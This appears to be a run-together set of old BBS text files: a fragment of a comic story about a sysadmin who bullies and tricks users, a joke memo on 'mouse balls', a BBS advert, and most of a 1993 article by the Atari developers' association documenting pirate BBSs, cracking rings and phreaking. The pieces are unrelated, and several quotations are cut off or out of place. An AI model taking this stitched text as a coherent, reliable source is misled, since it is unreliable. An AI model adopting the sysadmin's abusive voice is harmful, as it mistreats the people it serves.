DON'T BOTHER   I HAVE A COPY.  BE A GOOD GIRL AND PASS THE MESSAGE ON   She sobs her assent and I hang up.  And the worst thing is, I was just guessing about the purity test thing.   I grab a quick copy anyway,  it  might make for some good late night reading.    Meantime backups have finished in record time, 2.03 seconds.  Modern technology is wonderful, isn't it   Another user rings.   I need more space  he says   Well, why don't you move to Texas   I ask   No, on my account, stupid.   Stupid ! ....  Uh Oh..   I'm terribly sorry  I say, in a polite manner equal to that of Jimmy Stewart in a Family Matinee  I didn't quite catch that.  What was it that you said    I smell the fear coming down the line at me, but it's too late, he's a goner and he knows it.   Um, I said what I wanted was more space on my account,  please     Sure, hang on   I hear him gasp his relief even though he covered the mouthpeice.   There, you've got plenty of space now    How much have I got    Now this REALLY  PISSES   ME   OFF !  Not only do they want me to give them extra disk, they want to check it, to correct me if I don't give them enough. They should be happy with what I give them  and that's it !!!  Back into Jimmy Stewart mode.   Well, let's see, you have 4 Meg available    Wow!  Eight Meg in total, thanks!  he says pleased with his bargaining power   No  I interrupt, savouring this like a fine red, at room temperature  4 Meg in total...    Huh ...

Therefore, if a mouse     fails to operate or should it perform erratically, it may need a     ball replacement.  Because of the delicate nature of this     procedure, replacement of mouse balls should only be attempted by     properly trained personnel.      Before proceeding, determine the type of mouse balls by examining     the underside of the mouse.  Domestic balls will be larger and     harder than foreign balls.  Ball removal procedures differ     depending upon manufacturer of the mouse.  Foreign balls can be     replaced using the pop off method.  Domestic balls are replaced     using the twist off method.  Mouse balls are not usually static     sensitive.  However, excessive handling can result in sudden     discharge.  Upon completion of ball replacement, the mouse may be     used immediately.      It is recommended that each replacer have a pair of spare balls     for maintaining optimum customer satisfaction.  Any customer     missing his balls should suspect local personnel of removing     these necessary items.      To re order, specify one of the following       P N 33f8462   Domestic Mouse Balls     P N 33f8461   Foreign Mouse Balls  X                                                                           X   Another file downloaded from                                NIRVANAnet tm      the Temple of the Screaming Electron   Jeff Hunter          510 935 5845  Rat Head                                 Ratsnatcher          510 524 3649  Burn This Flag                           Zardoz               408 363 9766  realitycheck                             Poindexter Fortran   415 567 7043  Lies Unlimited                           Mick Freen           415 583 4102     Specializing in conversations, obscure information, high explosives,        arcane knowledge, political extremism, diversive sexuality,        insane speculation, and wild rumours.

Small Developers, Big Business       How Pirate BBSs Impact on the Entire Atari Community                 by D.A. Brumleve, President, IAAD                  Copyright 1993 by D.A. Brumleve  The Independent Association of Atari Developers represents over  sixty companies supporting the Atari ST platform with commercial  software and hardware.  Now and then a  pirate  BBS will come to  our members' attention.  We'll capture the file areas and study  them.  We'll cringe at the download counts and growl at the  messages about our products.  We'll download copies of our  products and trace the original owner.  Sometimes we'll even file  a police report, but the pirate board stays up and callers keep  calling, downloading, and uploading our programs.  And every time  we leave this experience further demoralized, less enthusiastic  about writing for the ST, less enthusiastic about programming in  _general_.    Recently, the IAAD undertook a more comprehensive investigation  of pirate BBSs in North America.  We solicited information from  the public    and the Atari community responded.  In spite of  some previous experience with pirate boards, I was not at all  prepared for the amount of pirate activity we found.   On each pirate BBS, we found numbers for other BBSs, many of  which also proved to have copyrighted files.  We found  concentrated pockets of heavy pirate activity in the Southwest,  the East, and the Southeast, but we also found isolated pirate  boards in just about every region of the continent.  We found  small boards with few users and fewer files  we found big boards  with hundreds of users offering nearly every commercial program  on the market of current interest.  We found young teens actively  involved in criminal activity    and older, more experienced men  showing them the ropes.  On every user list, I encountered folks  I know  the doting father who bought Super Kidgrid for his  daughter at a show, the user group officer who contacted me for  IAAD brochures, and many, many others who chat with me from time  to time on the major pay services.   Because of the scope and scale of this activity, I feel that it's  important to share our findings with the Atari community at  large.  What follows is the outcome of our investigation.  1. The Damage       This BBS DOES NOT support the transfer of any pirated             software.

Zaphod Beeblebrox on Fawlty Towers BBS  When people pirate programs they would otherwise buy, developers  and dealers  and distributors  lose sales.

Most  boards  pirate and legitimate  have separate file areas for  different kinds of products  MIDI, DTP, Applications, Utilities,  Games, Docs, Graphic Utilities, etc. .  A BBS which offers a  wealth of Utilities, for example, is likely to have a strong  database in other file categories as well.  Please note that  these are just partial lists from a single file category on each  of these boards.  A truly comprehensive listing would make this  article intolerably huge.  The IAAD's membership total fluctuates, but right now we are  holding steady around the 60 member mark.  Products owned or  distributed by nearly every single member were found on one BBS  or another during our investigation  some of our members were  victimized by every pirate board we called.  The self confessed pirate Troed says this about piracy         I NEVER buy a program without knowing if it is what I             want .. the ShareWare principle .. but how do I check             that with commercial software  By pirating them, using            them .. if I like them, I want the original   manual ..           I buy it.                                                            Troed on the F Net, ST Report Conference  but contradicts himself a paragraph later        I bought my STe for  800 one year ago, if I were to               registre buy  sic  all the soft I use I would have to             pay something around  10000 .. I can't afford that.                 Troed on the F Net, ST Report Conference             On the one hand, Troed insists that he merely tries out his  pirated software prior to purchase    and buys it if he wants it.   But on the other hand, he _uses_  10,000 worth of commercial  products and _cannot_ afford to pay for it.  I would concede that  it is possible that some software thieves do use their pirated  downloads in the same way that honest people use commercial demos  and shareware...some, but not many.  Developers are well aware of  software collectors .  These are  folks who simply must have a copy of everything, whether it meets  their needs or not.  The majority of software collectors want the  real thing, manual and all.  It's our experience that, because  pirate board users have to pay with an upload  or with money  for  each and every download, few will bother to download programs they  don't really want, need, and plan to use.  Because of this, the  majority of downloads from pirate boards must be viewed as lost  potential sales.  And those few pirates who are collectors or who  find they don't need a particular file will hang onto it and later  share it with others in order to earn upload credits.  We found Warp 9 on nearly every pirate board we called.  CodeHead  had purchased the QuickST kernal used for Warp 9 from Darek  Mihocka of Branch Always Software, and Charles Johnson worked  very hard to refine and extend it in order to deliver to us the  indespensible utility Warp 9 has become.  Like many CodeHead  products, Warp 9 is so easy to use that the manual is not needed  for basic use.  Warp 9 sells for  44.95  a purchase like this  wouldn't put many STers in the poorhouse.  But how many people  downloading this program from a BBS would go to the trouble of  ordering it after  testing it out    A good example of the speed at which pirates can destroy the  sales potential of a new release is shown by the upload date on  this entry found on the Rats Nest  the notation  Off  indicates  that this file has been removed, probably when a later version  superceded it    336   Warp9370.Zip    Off   09 13 92 Warp 9 v. 3.70   Glendale Release  CodeHead released this version on Saturday, September 12, 1992 at  the Glendale AtariFaire.  By Sunday, before the second day of the  show was even over, it was already in distribution by pirates.    What about more expensive products   At  795, Calamus SL by DMC  is one of the pricier offerings on the North American market.   It's a high end DTP package requiring or benefitting from an  additional investment in sophisticated Atari hardware,  accelerator boards, graphics cards, and a large capacity hard  drive.       It was bad enough to discover Calamus SL on just                  about every single  pirate  board that was                        investigated  it was worse to discover a program                  written specifically to strip out our serialization.              But the real kicker was to discover our entire 600                page manual available for downloading in ASCII.  The              people that run these boards are criminals and deserve            to be put in jail.  Their  customers , those that                 frequent these boards, are, at best, petty thieves.               What disgusts me the most is how many of these                     customers  would never consider themselves thieves               even though they are stealing from me, from my family,            from my company, and from the Atari community at large.             Nathan Potechin of DMC  Since the manuals for such extensive programs are truly required  in order to make good use of the product, software thieves will  actually go to the trouble of typing them in or copying them with  OCR software  which is also conveniently available on these  BBSs .  Even when a manual is indispensible, the software pirate  may have no need to actually purchase the program in order to  make full use of it.  Expensive products get that way because of development and  production costs.  While the raw materials in a typical software  package may cost only a few dollars, it takes much more than  pieces of paper and a disk to make a commercial product.  Calamus  SL cost DMC hundreds of thousands of dollars for development  staff alone, _not_ counting expenses related to the writing and  production of the manual, packaging, marketing, duplication,  overhead, etc.  A share of this expense must be borne by everyone  who uses the program in order to recoup costs and keep  development going.  When people use the program without paying  for it, this simply does not happen.  Many ST development firms are essentially one man shows  the  programmer is also the accountant, the publisher, the editor, the  secretary.  Developers like these are apt to take software theft  very personally and feel the impact very intensely.  One  developer's reaction to his product's proliferation on pirate  boards began   I used to be against captital punishment...        ...It hurts, and I don't mean that strictly in a                  financial sense, either.  We've tried hard, I mean                _really_ hard, to provide quality software at a                   reasonable price coupled with a customer support                  policy that is second to none...The pirate mentality              couldn't care less about us and our ideals of customer            service.  And that hurts.                                           John Hutchinson of Fair Dinkum        It's very discouraging to me to see illegal copies of             Flash II appear on these so called pirate boards.  I              wonder if the folks that steal our program understand             the length of time it took to produce it   Flash II               ver. 2.0 took 3 years to create and spent another year            in beta test.  Version 2.1 took close to another year             to modify and test.  We're practically giving it away             as it is!                                                           John Trautschold of Missionware  Word Perfect has been public about having dropped future  development for the ST and about the reason for that decision   low sales.  It can't be a coincidence that Word Perfect for the  ST was on many boards we called.    I doubt that STers are any less honest than owners of other  computer brands, but ours is a small market, and piracy here can  hurt developers much more than on more popular platforms.  If a  platform has 10 million users and 90  of them are pirates, the  software developers still have 1 million potential buyers.  On a  platform like the ST, with only a few hundred thousand users at  most by comparison, even if _no_one_ stole software, developers  would still only have a few hundred thousand potential buyers.  In  reality, only the most popular products are likely to sell in  quantities greater than 1000 units in North America.  In the case  of a coveted and respected multi platform application like Word  Perfect, if the program had not been pirated so many times over,  the sales figures might well have been sufficient to justify  further development for the benefit of ST owners.       I talked to a couple of shops...and...asked if they               were interested in carrying any music education stuff.            They said that they would love to carry some but could            not sell any education, music, or game software due to            the fact that if anyone wanted a copy they would pirate           it...The only thing they have real success at selling             is applications due to people wanting a printed manual            phone support...I didn't make a sale.                               Jim Collins of chro_MAGIC  There's a small profit margin in selling computer hardware   dealers depend on income from software sales to sustain their  businesses.  In every area where large pirate boards flourish,  Atari dealers have closed their doors in spite of a comparatively  large installed base of users.   It got to the point where I sold  only magazines,  one former dealer complained.   They'd buy the  magazines to find out what programs were worth downloading.    Honest users in these areas are likely to grumble about the loss  of the dealers  pirates grumble, too, because their link to new hardware, service, and magazines has been lost.  Every dealer  lost means fewer hardware sales for Atari, fewer software sales  for developers, fewer new members for users groups, fewer  vendors and attendees at fewer shows.     With the Atari user base in serious decline, it is more important  now than ever that piracy not be tolerated.  Make no mistake  about it  pirated software is _not_ free.       Wait wait wait... There is nothing positive piracy does            for a computer company. Nor is it anything BUT negative.          I look at it like this...We can always blame Atari for            not advertising, but if there were no Atari pirates,              more software would have been sold, making the computer           more viable for software companies, which in turn makes           the computer more desirable for a user. So, basically             what I'm saying is, the people who love Atari the most,            us  are the same people who have been killing it for             years.  And there was a time when Atari was big                   EVERYWHERE...There was even an Atari dealer here in my            little town of Lake Wales! That's where I bought my 400!             Fruit WARE Man on Excalibur II BBS  Ultimately, we all pay for piracy one way or another  Atari,  developers, dealers, and users    even the pirates.    2. How it Works  For the uninitiated, let's define some terms.  A  pirate board   is a Bulletin Board System  BBS  on which copyrighted commercial  files are offered to users for downloading without compensation  for the copyright holder.  Some pirate boards are devoted to this  activity almost exclusively, and sysops running these boards  accept only fellow pirates as users.  Other pirate BBSs have  pd shareware files areas in addition to hidden commercial areas   honest users of such boards may have access only to the  pd shareware sections and may be completely unaware of the pirate  nature of the board.    Software pirates have a unique lexicon to describe their  activities.  Users allowed into the commercial areas have been  granted  elite access .  The commercial files are referred to as   warez   elite file areas on some BBSs include sections on such  related topics as pornography, defrauding long distance carriers,  and creating one's own Super Nintendo Entertainment System  cartridges by burning the software into EPROMs.  Callers who take  without giving back  download without uploading  are called   leeches , and downloadable files may be referred to as   leechables .  Defrauding the phone company by using illegal  techniques to make long distance calls is a mainstay of the art of   phreaking .   Cracked  versions of programs have the copy  protection and or registration and serial numbers removed.   0  day  is the day a commercial product is officially released.  Many  pirates have also adopted a manner of writing which flaunts the  rules of our language, such as swapping lower and upper case,  substituting  z  for  s  and  ph  for  f , etc.  Successful software theft has two basic requirements  a dishonest  person willing to give away a copy of a program he has purchased     and another dishonest person willing to accept it.  When this  activity takes place on a Bulletin Board System, a given copy can  be distributed rapidly from BBS to BBS, from user to sysop to  user, all over the world.  One person's willingness to give away  that first copy can lead to its possession by literally thousands  of others.  Pirate boards succeed because there are many people  willing to give or take the copies    and because the sysop uses  strategies calculated to maintain and escalate their involvement.  The pirate sysop sets up his BBS, invests in a high speed modem  and phone lines, and advertises his number on other BBSs.  When  the calls start coming in, the sysop scrutinizes each would be  user and decides whether or not to validate the new account and  what level of access to allow.         I've seen credit applications that made more sense.                  Sandy Wilson on GEnie, describing a brief encounter          with the new user questionnaire on a BBS running          RATSoft ST       Do you believe in the free distribution of software be            it copyrighted or not                                                Fawlty Towers BBS, from the new user questionnaire  The sysop has two major responsibilities  to keep the board  running and to ensure security.  He requires full disclosure from  his callers.  He wants his callers' real names, real addresses,  real phones, but he is not likely to reveal his own name or  location.  There is usually an elaborate questionnaire.  The  sysop may call the new user's voice number to check its  authenticity.  He may do thorough background checks with other  information the caller has provided.  He may keep a blacklist of  uncooperative or non productive callers  leeches  and share it  with other sysops.        NEW USERS  IF YOU DON'T DO A NEW USER UPLOAD YOU WILL NOT         GET ACCESS. IF YOU DON'T KNOW WHAT A NEW USER UPLOAD IS           YOU DON'T BELONG ON THIS BBS.                                        PAK on STampede BBS  The callers themselves supply the warez which keep the board  active.  They earn credits for uploading, and apply those credits  toward future downloads.  Pressure to upload a file often begins  immediately after a new user's account is validated.  It may even  be part of the new user questionnaire prior to validation.   Typically, a New User Upload is required before the new user is  given full access, including the ability to download.  Sometimes  the sysop will allow the new user to view the files area on the  BBS in order to entice the caller into uploading a commercial  file.  On other boards, the commercial files area will stay  completely hidden from the new user until after he has proved his  worthiness    and incriminated himself    by sharing a commercial  program of his own.  Like a kid in a candy store, the caller wants one of everything,  but to get it, he must pay the price.  So he looks at his  collection and chooses a program he hopes will meet with the  sysop's approval.  Merely uploading the program may not be enough  to gain elite access  the upload may be judged on how new it is,  whether the board already has a copy, or even whether the program  chosen is useful or well reviewed.       You Understand that you MUST keep a 'reasonable' file             Upload  Download ratio And   K Byte  ratio or your                Access WILL be Lowered and maybe Deleted!!                           Gold Nugget BBS, from the new user questionnaire       Donate!  King Arthur has a very reasonable donation               policy that makes it easily affordable to have                    unlimited download credits...It's so much fun on the              Atari  and soon to be Falcon  scene now that there's              no excuse for you to miss out!                                       Little Flea on Excalibur II BBS       ...I started caring, and so the users that DID not post,          called within 30 days, and sent new files, got kicked             off.. YOU DONT  sic  GET NOTHING FOR FREE!!!                        The Conjurer, sysop of Outer Planes BBS, on the F Net,         Elite Underground Conference  The sysop uses his warez to entice callers, but he may also  perfunctorily ax callers who violate his rules or confidentiality  requirements.  The threat of being cut off from the source keeps  the callers uploading on a regular basis.  The BBS software keeps  track of a user's download upload ratio  ratios that are  unacceptably high on the download side may result in censure by  the sysop or loss of access.  If a user has no files of value  to offer the sysop, he may be able to gain privileges by sending  in a  donation .  Some sysops forego the euphemisms and announce  flatly that they charge for greater access.       Does anyone have Trump castle  Im  sic  starting to run           thin on other boards for credits. I would rather save             them for the 0 days stuff. If you have it could you               please u l it.                                                      Shadow Master on London Smog BBS  In order to keep his account current, the user may be forced to  call in every few weeks  each call results in a deduction from  the user's credit total, so he's back looking for new files to  upload.  If the caller gets those files from another BBS, he'll  get caught up in a never ending cycle of uploads and downloads in  order to keep his accounts active on all the boards he calls.   Occasionally, he may have to buy a program outright in order to  upload it.  The caller is reminded of any deficit in his credit  total every time he calls and may be denied access to certain  areas until the total is in the black.       Well, after being away from the BBS scene for awhile, I           have finally found an Elite BBS!  Thanks PAK!   . Anyhow,         please send me BBS   NUPs for boards that carry elite             Macintosh or SNES console stuff.                                     Nostrildomus on STampede BBS  Some pirate only BBSs won't allow any but the most serious of  callers.  They may require all users to have 9600 baud modems or  greater.  They may limit 2400 baud callers to less desirable  calling hours.  Some require would be callers to announce their  first upload before being allowed access  the sysop then decides  whether or not this caller will be a valuable contributor on that  basis.  Some require referrals from other pirate boards.  A twist  on this is the New User Password, spread from user to user.   Boards like the Computer Connection will ask for this  NUP  in  the new user questionnaire.  If the caller cannot provide it,  access is not granted.  Most boards ask at the very least for the  names and numbers of the boards the new user already calls  a new  user who provides incorrect numbers or fictional board names     or who lists only legitimate BBSs    may be denied access.  The sysop's users provide his warez, and the sysop is a direct  beneficiary.  Like a golden goose, a single program keeps giving  and giving.  One user paid for it once, but the sysop can  distribute it to other users in trade for additional warez or  money again and again.  The current callers spread the word about  the BBS's offerings to others, thus increasing the number of  users frequenting the board and providing uploads.  Some boards  encourage this by offering download credit for user referrals.   While operating a BBS is the least labor intensive way to  accumulate warez, it may not be the most efficient way to make  money.  After all, there's a whole market of non modem users out  there just waiting to be tapped.  For a tidy fee, sysops may sell  copies of their warez via mail order  through schemes like these,  users can obtain pirated software without the costs of a high  speed modem and long distance calls and the pressures of the  upload download ratio.  3. Paranoia Strikes Deep  All BBS sysops, even the most responsible, put themselves at some  risk of legal complications due to messages, e mail, and files  posted by users.  It takes a special motivation for a sysop to  actually promote and encourage an illegal activity which increases  his risk and liability.  For some, money or software may be  sufficient motivation.  Others may make up for social inadequacy  in their offline lives by taking a leadership role online.  And  many of these seem to enjoy the power they have over their users.   Like schoolyard bullies, they control and police their turf with  heavy handed threats and zero tolerance judgments, all with the  protection afforded by their anonymity.  On their own BBSs, they  call the shots    and no caller can challenge them on that.

Happy Hideaway BBS       Re transmission of material from this BBS is strictly             forbidden without written permission of the Sysop s !!!              The Ghetto! BBS  Some sysops are very protective of their warez.  They want their  boards to be the best, to have the most highly prized files, to  attract the greatest number of active users.  The sysop may claim  that his board is protected by international copyright laws  that  is, he has a copyright on the _collection_ and he has a right to  control the distribution of any part of it.  A user may download  from his BBS, but he'd better not find that user uploading the  same program to a competitor.  In other words, the sysop contends  that he has exclusive rights to the black market product!         I agree with these conditions, and I am not a                    member employee of ANY authority like the Police, or              anything like that, nor am I an employee of ANY type of           non public domain software company, Telephone company             security or some anti software piracy organization.

Outer Region BBS  Sysops are well aware of the illegal nature of their activity,  and they may go to great lengths to protect themselves from legal  action.  Most boards post disclaimers about the sysop's  responsibility for the activities which take place there.  Others  try to compromise the submissability of legal evidence by  requiring investigators to reveal themselves.        You have failed to answer a security validation                    question properly.                                                  Paris BBS  In the midst of such paranoia, it's not surprising that most  pirate BBS callers and sysops use pseudonyms.  Frequently a user  goes by the same pseudonym on every board he calls so that his  online friends can identify him, send him e mail, etc.  We've  identified many pseudonym users in spite of their attempts to  hide their identity.  Here are a few examples of the thousands of  aliases used by callers on pirate boards.  They know who they  are.  And you may be surprised to find that _you_ know who they  are, too   RAHMAN                   Clockwork Orange         Stsoft Elof                     Zaphod Beeblebrox        Troed Hack Hack                KG                       mr.fly ics Looms                    Hanzon Horizon           Sparky Yellow Lightning         PAK                      slash ics  The Piper                The Parsec               The Shamus Mouse Master             Overlord                 RoadKill The Missing Link         Nightmare                Deadhead Ed Little Flea              the threat ics           jpc ics belgarion ics            Disease Factory          Frosty Sledge                   Archiver                 Spy Guy Traveler                 The Dragon Lord          Frogger Shadow                   Skinhead                 rhys ics Sparky                   KRS ONE                  Ice Pirate Clueman                  Arthur Dent              DANE Goat Slayer              Norstar                  Speed Demon Time Warp                Snow Queen               Mr.terry  Who are the people who go by these aliases   Who calls pirate  BBSs and who runs them   A 16 year old high school junior whose  supply of British games multiplied out of control when he added a  high speed modem to his system   Yes.  A 32 year old father of  two who in all other ways is the very model of integrity   Yes.   The good old boys who bring crates of software to swap at your  users group meeting   You know it!  A 50 year old con artist who  makes thousands of unreported  i.e., tax free  dollars every year  by convincing others to give him programs to sell   Absolutely.   Several hundred software thieves are so active and on so many  BBSs that it's hard to imagine that they have time for anything  else.  The thousands of more casual pirates may have access to  only a few boards and call only a few times a month.  And whether  a specific pirate BBS has 50 regular users or 500, its phone  lines are constantly busy.  4. Organized Crime  As with other criminal activity, the big players in software  theft have formed alliances to share files, blacklists, message  networks, and other information.  There are dozens of these  organizations, some international in scope.  For example, The  Elite, with world headquarters in the Netherlands, is  headquartered here by the Outer Region BBS in Colorado and  Dragon's Pub in Quebec.  The Syndicate  TSC  has representative  BBSs on three continents and in both hemispheres  the Happy  Hideaway in Florida serves as its Eastern US headquarters and  Outer Region as its Western base, while the Shire BBS in Chile  and the Eagles Nest and Slime City BBSs in Sweden provide an  international link.   Cracking organizations are devoted expressly to undermining copy  protection and registration strategies used in commercial  programs.  Outer Planes in Ohio is the world headquarters for the  cracking ring known as CyniX.  STampede, in Plant City Florida,  is the International Cracking Society's  ICS  US headquarters and  features its cracked warez, but these rapidly spread to other  BBSs across the country and so can be found on many other boards  as well.  Cracking rings are often multi platform in scope   individual crackers will work on getting around the copy  protection on the platform of their choice.  They'll share  cracking tips with and seek advice from ring members working on  other platforms.  The Pompey Pirates cracking ring, headquartered  on the Paris BBS in New York City, reportedly has just one  cracker, who goes by the name of Alien, working routinely on the  ST, while cracking rings like ICS include many ST enthusiasts.  ICS, MCA, Section 1, CyniX, and other crackers are very well  connected, using ultra high speed modems and multi frequency  dialers to call all over the world without long distance fees.   It's not unusual to find a cracker from one ring visiting the  headquarters of another and sharing warez.  Cracking rings  compete vigorously for the first crack of  0 day warez   brand  new releases , for the most successful crack, for the toughest,  etc.  Pirate boards have aligned themselves with legitimate networks as  well.  Many of the BBSs on which we discovered commercial files  areas are linked to the F Net    and, of course, so are plenty of  responsible BBSs.  For example, according to a CrossNet Conference  Node Listing, The Time Warp BBS  F Net node 99  serves as the lead  node for the  Elite Underground  F Net conference, which also  includes Starlight BBS  node 287 , Darkworld BBS  node 305 , Outer  Region BBS  node 469 , Steal Your Face  node 489 , Outer Planes   node 558 , Gold Nugget BBS  node 622 , London Smog BBS  node  632 , Million Dollar Saloon  node 639 , Speedy's Raceway  node  689  and H.B. Smog  node 712 .  According to another CrossNet  Conference Node Listing, The Gold Nugget serves as the lead node  for The  Pompey Pirates Elite   not directly associated with the  Pompey Pirates cracking ring mentioned above  F Net conference   The Prairie Chip II BBS  node 45 , The Blackhole  node 612 , The  Temple of Doom  node 595 , and Spider man's Web  node 711  are  among the 9 BBSs involved in this conference.  The  Upper Echelon   F Net conference ties US and Canadian boards by serving callers on  the Gold Nugget in Ohio, Steal Your Face in New Jersey, Space  Station BBS  node 248  and London Smog in California, Million  Dollar Saloon in Texas, Paybax BBS  node 307  in Delaware, and  Aardvarks from Mars  node 38  and Dragon's Lair  node 87  in  Ontario.  Conferences of this kind allow pirates from great distances to   get to know  each other, to exchange files as well as messages,  to solicit calls to their favorite BBSs.  Participation in these  conferences establishes an online identity  a pirate recognized  from his posts on one node of a conference is likely to be  accepted without question when logging on as a new user on  another node in the same conference.  There are also smaller F Net related conferences for pirating  discussions.  For example, according to a CrossNet Conference  Node Listing, a Local Area Private Elite Conference with a lead  node at the Outer Region links with three other BBSs in Colorado,  including RingWorld  node 643 , The Grave Diggers Tomb  node  186 , and BILINE BBS  node 423 .  Outer Planes is the lead node  for the 4 node  Console  conference, a message thread devoted to  topics related to pirating SNES and other game console warez.  5. Ill Begotten Goods, Fawlty Filez...   Pirating hurts the entire ST community by discouraging third  party development, closing down dealerships, and raising software  prices.  But is it a  good deal , at least in the short run, for  the pirates themselves   Let's ask 'em         Mock me not!  Civilisation is great.. Except it is                cracked poorly...Can't win with the Cynix crack...

After               twenty copies of it are made, it wipes out your disk.             Use UVK to kill the virus, and be careful with swapping           disks around this one.

Will someone PLEASE UPLOAD a FULLY working version           for KOBOLD 2 I've had so many different version from              different people and they are  ALL bad !!!                          Sidewinder on Outer Region BBS       I have an elite copy of Calligrapher and it doesn't               support ASCII text files, so you can only work with               .CAL files  files made by Calligrapher   Also it doesn't          have keyboard equivalents  a pain                                   Frogger on the F Net, Elite Underground Conference   Pirates aren't entitled to support from commercial developers and  are often working without any documentation, so they are very  likely to encounter problems with their warez.    The real version of Calligrapher, for example, has several import  and export options, including ASCII.  It has configurable keyboard  commands.  Frogger's version might have been hacked in a way which  destroyed these capabilities, or he simply might not know how to  take advantage of them because he has no documentation or support.    When pirates spread disinformation about the warez they use,  people may think they are speaking out of knowledge of the actual  commercial release.  In this way, a pirate's ill informed comments  about products can discourage sales to others.  The software they use    like the sysops and other pirates with  whom they associate    cannot be trusted.  Cracked software is  prone to be flakey.  And the same type of people who think it's  acceptable to crack and steal software are also the type who write  viruses and unleash them on others, so even files which haven't  been cracked must be viewed with suspicion.  In addition to the fear of loss of access, the pressure to upload  or pay, lack of official and informed support, an online  environment of suspicion and paranoia, and abandonment of ethical  principles, pirates must also contend with software that is  unreliable and potentially dangerous.  The pirate pays a heavy  price.  Pirated software is _not_ free    for anybody.  6. Phreaking, Copyright Infringement, Pornography, and the Law  The users pay the sysop of a pirate board, either by sending a  check for greater access or by offering up files they've  purchased in exchange  or both .  Heavy users must invest in  expensive hardware, such as high speed modems.  And for many  callers, there's a long distance charge.       If any of the USA callers has MCI you can put this bbs            on you  sic  Friends and Family list and save yourself            about 3 cents a minute. Just say that the phone number            is for a data line and they usually don't ask anymore             questions.

STampede BBS       I call the whole world for the same price.                           Troed on Rats Nest BBS  Not all those living far from a BBS pay long distance charges,  however.  Some boards share calling card numbers  belonging to  innocent victims, presumably  so that the phone company will  charge the users' calls to someone else.  Sometimes users as far  away as Chile or Sweden manage to make calls at no cost by  fooling and defrauding their long distance carriers.  In the old  days  defined here as the 70's , this was achieved by building a   bluebox  and installing it in one's phone line.  Today, it's  easily done in software.  The caller's ST simulates the tones  recognized by the telephone system.  Calls are routed all over  the world and back, typically through South America, in order to  confuse the system and avoid detection.  This activity is just as  illegal as copyright infringement, and it's also better  understood as a crime by police.  Many times a pirate board is  closed down not because of the illegal transfer of software, but  rather because information on blueboxes was available for  download.        Word is around town that there are feds looking for               Pirate BBS's. I know weather to belive  sic  it but               it could be time for another big bust like there was              four years ago. Supposedly a Big BBS in OHIO just got             nailed real bad!. Freaky as hell.                                   Mind Eye on Thieves Guild BBS  There are, in fact, many approaches to shutting down pirate  boards.  Copyright infringement is one obvious track.  The  Software Publishers Association is a watchdog agency which works  with the FBI to shut down large scale BBS operations.  There are  legal departments at major computer, game machine, and software  companies devoting time and effort to this task.  There's the IRS  connection for unreported caller  donations .  Some boards come  down because of the availability of pornography.  There are a  variety of criminal laws related to activities common on pirate  boards, and, especially in cases of copyright infringement, civil  law may offer the most effective route to compensation for the  victims.  When a board is busted by the authorities, the related equipment  and property is usually seized.  Any records of callers, caller  donations, etc., are seized along with that equipment.  Callers  could be charged with conspiracy.  For this reason, it's not wise  to have one's real name, address, and real phone show up in the  records of a pirate board, even though the sysop adamantly  insists upon it and uses verification checks to enforce it...    7. Spotting a Pirate Board       Many people may not realize that software pirates cause           prices to be much higher, in part, to make up for                 publisher losses from piracy.  In addition, they ruin             the reputation of the hundreds of legitimate bulletin             boards that serve an important function for computer              users.                                                              Ken Wasch, Executive Director of the SPA, as quoted in        STR  915   I recently logged on to the Polish Hideout BBS in Southern  Illinois.  What a contrast it presented to the pirate boards I've  been investigating!  The questionnaire asked only for my name,  contact information, and type of computer.  Validation was  immediate and I was granted access to all message bases and file  areas on that very first call!  I wasn't under any obligation to  upload before downloading.  There was no pressure to compromise  my principals nor temptation to indulge in criminal activity.   The messages from the sysop were friendly and inviting.  The  Polish Hideout is _not_ a pirate BBS.  It can be tough to differentiate a pirate board from a legitimate  one if one has not been granted access to the elite areas.   Sometimes non elite discussion or file areas can provide hints,  but it's not sure fire.  For example, although many pirate boards  can boast of extensive pornography collections, some BBS sysops  who wouldn't tolerate commercial files will nevertheless offer  pornography  the existence of pornographic files does not in and  of itself indicate a pirate board or clientele.  Even the  existence of an isolated commercial file in the downloads is not  evidence of intentional piracy.  From time to time, every BBS  receives a commercial upload or two  sometimes the sysop overlooks  the file or doesn't recognize it as commercial and leaves it in  the download area.  Such oversights and accidents do not even  remotely correspond to the kinds of activity we have encountered  on BBSs where software theft is encouraged.  A typical pirate board includes a highly aggressive  and often  hostile and suspicious  new user questionnaire.  It is often  necessary to provide referrals of some kind, and the questions  are likely to assume dishonesty on the part of the new user.   Pirates, as a rule, are not nice guys, and the new user is  usually made to feel very uncomfortable.  The new user may be  required to  sign  disclaimers.  The Other BBS list is likely to  include some other pirate boards.  If the users adopt the lexicon  of piracy   elite ,  warez ,  philez , etc. , If ThErE aRe LoTs  Of PhRaSeS wRiTtEn LiKe ThIs, if the board associates itself with  a pirate syndicate or network, if it has numerous known pirates  as callers, if there is aggressive insistence on the maintenance  of download upload ratios, if deadbeats are threatened with loss  of access, if phreaking files are available online, chances are  very good that the caller has stumbled onto a pirate BBS.  There are legitimate reasons why a BBS sysop might want accurate  contact information from his callers.  There are also good  reasons in many cases for offering a few private file and message  areas.  Most BBSs, pirate and legitimate, require validation,  usually by phoning the caller's number.  Such features are not  unusual, but if combined with heavy handed warnings and threats,  they tip the user off to the nature of the board.  It should be  noted that legitimate pd shareware BBSs far outnumber the pirate  boards.  The confusion between the two is most unfortunate.       I...have callers uploading commercial software and                giving me a hard time because I don't have an  elite              area, even though they see a message when they log on             as a new caller that this board does not support                  piracy...It's a _risk_ to run a BBS, and not many ways            to protect the investment.                                          sysop of a legitimate BBS  If a board you call has an occasional commercial file, be sure to  point it out to the sysop for his own protection  a responsible  sysop will avoid commercial offerings.  PD shareware BBSs perform  a much needed service in supporting our Atari community  the IAAD  applauds and encourages this effort.  If you suspect    or _know_    that a board you call offers  numerous commercial files, however, please bring it to the  attention of the IAAD  online addresses are available at the end  of this article .  Your anonymity is assured.  We are already  intimately familiar with dozens of boards, but additional  information is always welcome.  8. The Moral Toll  As the Twig is Bent...       Right and wrong now seem the same                                    Rats Nest  As a parent, I'm concerned about the numbers of young people  logged on to pirate boards.  These kids put themselves in a very  vulnerable position.  In earning their right to download, young  callers are implicated in the illegal activity.  The adults who  run and participate on these boards set an example which could,  by extension, lead to ignoring the laws which govern other areas  of their lives.  Do these kids also shoplift, steal from other  kids' lockers, buy termpapers to submit as their own   Children  learn to run and to use pirate boards from adults whose character  is questionable by definition.  When a child has such a sysop as  a role model, what does that spell for his future   Like the proverbial stranger who offers candy, these criminals  lure teenagers and young adults with promises of free software in  exchange for their services.  The service, of course, is to  provide more free software    which the sysop can then use to lure  more callers and to keep his current clientele calling back. 